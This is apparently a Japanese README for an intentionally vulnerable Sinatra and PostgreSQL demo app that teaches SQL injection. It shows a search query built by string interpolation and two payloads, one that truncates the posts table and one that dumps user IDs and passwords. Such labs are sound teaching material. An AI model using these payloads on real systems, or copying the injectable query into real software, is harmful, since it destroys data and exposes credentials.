# sql_injection

１．sql-injection.sqlファイルのsqlを実行してデータベース環境を構築して下さい。

２．データベース接続の設定を適宜編集して下さい。(デフォルトではpostgreSQLを使用)

## SQLインジェクションの内容
app.rbの検索フォームSQL文
`select title, content, date from posts where title like '%#{params[:search]}%' or content like '%#{params[:search]}%`

### テーブルのデータをすべて削除する
`'; truncate table posts; --`

以下のようにSQL文として解釈されてしまう  
`select title, content, date from posts where title like '%'; truncate table posts; --%' or content like '%#{params[:search]}%'`

### ユーザーIDとパスワードを表示する
`' union select userid, password, current_date from users; --`

以下のようにSQL文として解釈されてしまう  
`select title, content, date from posts where title like '%' union select userid, password, current_date from users; --%' or content like '%#{params[:search]}%'`

## gem
- sinatra  
- pg  
